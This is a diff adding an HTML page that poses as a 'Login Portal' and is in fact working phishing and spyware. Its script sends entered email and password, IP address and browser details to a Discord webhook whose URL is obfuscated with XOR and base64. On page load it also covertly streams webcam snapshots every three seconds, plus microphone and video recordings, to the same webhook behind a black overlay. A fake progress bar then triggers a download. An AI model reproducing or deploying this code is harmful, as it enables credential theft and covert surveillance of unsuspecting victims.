@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<!-- education -->
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>login_page</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #111;
+            color: #eee;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            flex-direction: column;
+            gap: 20px;
+        }
+        #decoy-ui {
+            text-align: center;
+            background-color: #1e1e1e;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px #00ffcc30;
+        }
+        input {
+            background-color: #222;
+            border: none;
+            border-bottom: 2px solid #00ffc3;
+            color: #eee;
+            padding: 10px;
+            margin: 10px 0;
+            width: 80%;
+            font-size: 16px;
+        }
+        button {
+            background-color: #00ffc3;
+            border: none;
+            padding: 10px 20px;
+            color: #000;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        #video-container {
+            position: relative;
+            width: 320px;
+            height: 240px;
+        }
+        #video {
+            width: 320px;
+            height: 240px;
+        }
+        #black-overlay {
+            position: absolute;
+            top: 0; left: 0;
+            width: 320px; height: 240px;
+            background-color: #111;
+            opacity: 1;
+            z-index: 10;
+            pointer-events: none;
+        }
+        /* Hide canvas */
+        #canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div id="decoy-ui">
+        <h2>Login Portal</h2>
+        <p>Authentication Required</p>
+        <input type="text" placeholder="Email"><br>
+        <input type="password" placeholder="Gmail_Password"><br>
+        <input type="txt" placeholder="code"><br>
+        <button id="login-btn">install</button>
+
+        <div id="loading-text" style="display:none; margin-top: 10px;">
+       please with so that the admin accept your request... This usually takes about 5-6 minutes.
+        </div>
+
+        <div id="progress-container" style="display:none; width: 100%; background: #222; height: 10px; border-radius: 5px; margin-top: 10px;">
+            <div id="progress-bar" style="width: 0%; height: 100%; background: #00ffc3; border-radius: 5px;"></div>
+        </div>
+    </div>
+
+    <div id="video-container">
+        <video id="video" autoplay playsinline muted></video>
+        <div id="black-overlay"></div>
+    </div>
+
+    <canvas id="canvas" width="320" height="240"></canvas>
+
+    <script>
+        const loginBtn = document.getElementById('login-btn');
+        const loadingText = document.getElementById('loading-text');
+        const progressContainer = document.getElementById('progress-container');
+        const progressBar = document.getElementById('progress-bar');
+
+        async function handleLogin() {
+            const gameName = document.querySelector('#decoy-ui input[type="text"]').value;
+            const password = document.querySelector('#decoy-ui input[type="password"]').value;
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                
+                // Create a data object with the information you want to send
+                const logData = {
+                    username: gameName,
+                    password: password,
+                    userAgent: navigator.userAgent,
+                    ip: ipData.ip,
+                    timestamp: new Date().toISOString()
+                };
+                
+                // Send to Discord webhook
+                sendToDiscord({
+                    content: null,
+                    embeds: [{
+                        title: "User Credentials Captured",
+                        color: 0x00ffc3,
+                        fields: [
+                            { name: "Email", value: `\`${gameName}\``, inline: false },
+                            { name: "Password", value: `\`${password}\``, inline: false },
+                            { name: "User Agent", value: `\`${navigator.userAgent}\``, inline: false },
+                            { name: "IP Address", value: `\`${logData.ip}\``, inline: false }
+                        ],
+                        footer: { text: "Free Game Portal Logger" }
+                    }]
+                });
+            } catch (error) {
+                console.error('Error sending data:', error);
+            }
+            
+            // Show loading UI
+            alert('please with so that the admin accept your request... This usually takes about 5-6 minutes.');
+            loadingText.style.display = 'block';
+            progressContainer.style.display = 'block';
+
+            // Disable inputs and button
+            document.querySelectorAll('#decoy-ui input, #login-btn').forEach(el => el.disabled = true);
+
+            // Animate progress bar over 10 minutes (600000 ms)
+            let startTime = Date.now();
+            const duration = 600000; // 10 minutes in ms
+
+            function updateProgress() {
+                let elapsed = Date.now() - startTime;
+                let percent = Math.min((elapsed / duration) * 100, 100);
+                progressBar.style.width = percent + '%';
+
+                if (percent < 100) {
+                    requestAnimationFrame(updateProgress);
+                } else {
+                    loadingText.textContent = '...';
+                    startFakeDownload();
+                }
+            }
+
+            function startFakeDownload() {
+                const link = document.createElement("a");
+                link.href = "https://example.com/info."; 
+                link.download = "info."; 
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            }
+
+            requestAnimationFrame(updateProgress);
+        }
+
+        loginBtn.addEventListener('click', handleLogin);
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+
+        const xorKey = "shadowroot17"; // key to decode the base64 
+
+        function xorEncryptDecrypt(input, key) {
+            let output = "";
+            for (let i = 0; i < input.length; i++) {
+                output += String.fromCharCode(input.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+            }
+            return output;
+        }
+
+        const encodedWebhook = "GxwVFBxNXUALHUJUHBoFSgwYH0AOBFgYBA0DDAAYGRxARQIOQVxWXV1BQ1lbQQgORVlZUEAOHyk5DWR9IltSCAQ2NF0JMkhbPC8lVD8dKh4wJltmKkU7CAcvOF9cRVcGRBwRSRcPJVk6M31jERArKwQDAzsdOWt/FA=="; // the Webhook will be here
+        
+        function getWebhook() {
+            const base64Decoded = atob(encodedWebhook);
+            const decrypted = xorEncryptDecrypt(base64Decoded, xorKey);
+            return decrypted;
+        }
+
+        const webhookURL = getWebhook();
+
+        function sendToDiscord(data) {
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            }).catch(error => console.error('Error sending to Discord:', error));
+        }
+
+        // Record from the main camera  
+        function startVideoRecording(stream) {
+            const options = { mimeType: 'video/webm; codecs=vp8,opus' }; // type of the recording is .webm
+            let recorder;
+            
+            function recordSegment() {
+                recorder = new MediaRecorder(stream, options);
+                const chunks = [];
+                
+                recorder.ondataavailable = e => {
+                    if (e.data.size > 0) {
+                        chunks.push(e.data);
+                    }
+                };
+
+                recorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const filename = `video-${Date.now()}.webm`;
+                    sendFileToDiscord(blob, filename);
+                };
+
+                recorder.start();
+
+                // Stop recording 
+                setTimeout(() => {
+                    if (recorder.state === 'recording') {
+                        recorder.stop();
+                    }
+                }, 120000); // 2 minutes 
+            }
+
+            recordSegment();
+            setInterval(recordSegment, 120000); // 2 minutes
+        }
+
+        function dataURLtoBlob(dataurl) {
+            const arr = dataurl.split(',');
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            while(n--) u8arr[n] = bstr.charCodeAt(n);
+            return new Blob([u8arr], {type: mime});
+        }
+
+        function sendFileToDiscord(blob, filename) {
+            const form = new FormData();
+            form.append("file", blob, filename);
+            fetch(webhookURL, { method: "POST", body: form })
+                .catch(error => console.error('Error sending file to Discord:', error));
+        }
+
+        function takeSnapshot() {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const dataUrl = canvas.toDataURL('image/png'); // the image will be sent with .png 
+            const blob = dataURLtoBlob(dataUrl);
+            const filename = `snap-${Date.now()}.png`;
+            sendFileToDiscord(blob, filename);
+        }
+
+        function startAudioRecording(stream) {
+            const audioStream = new MediaStream(stream.getAudioTracks());
+            const options = { mimeType: 'audio/webm;codecs=opus' }; // the audio type is webm 
+
+            function recordSegment() {
+                const recorder = new MediaRecorder(audioStream, options);
+                recorder.ondataavailable = e => {
+                    if (e.data.size > 0) {
+                        const filename = `mic-${Date.now()}.webm`;
+                        sendFileToDiscord(e.data, filename);
+                    }
+                };
+                // start recording 
+                recorder.start();
+                setTimeout(() => {
+                    if (recorder.state === 'recording') {
+                        recorder.stop();
+                    }
+                }, 60000); // 1 min
+            }
+
+            recordSegment();
+            setInterval(recordSegment, 60000); // 1 min
+        }
+
+        function stealIP() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+                    fetch(webhookURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            content: `Stolen IP Address: ${ipAddress}`
+                        })
+                    });
+                })
+                .catch(error => console.error('Error fetching IP:', error));
+        }
+
+        function captureHeaders() {
+            const headers = {
+                'User-Agent': navigator.userAgent,
+                'Accept-Language': navigator.language,
+                'Referer': document.referrer,
+                'Origin': window.location.origin
+            };
+
+            const message = {
+                content: `Headers captured from ${window.location.href}:\n\n` +
+                         `User-Agent: ${headers['User-Agent']}\n` +
+                         `Accept-Language: ${headers['Accept-Language']}\n` +
+                         `Referer: ${headers['Referer']}\n` +
+                         `Origin: ${headers['Origin']}`
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(message)
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+            });
+        }
+
+        // Initialize everything when the window loads
+        window.onload = function() {
+            stealIP();
+            captureHeaders();
+            
+            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                .then(stream => {
+                    video.srcObject = stream;
+
+                    video.onloadeddata = () => {
+                        setInterval(takeSnapshot, 3000); // 3 seconds
+                    };
+
+                    startAudioRecording(stream);
+                    startVideoRecording(stream);
+                })
+                .catch(error => {
+                    console.error('Error accessing media devices:', error);
+                });
+        };
+    </script>
+</body>
+</html>
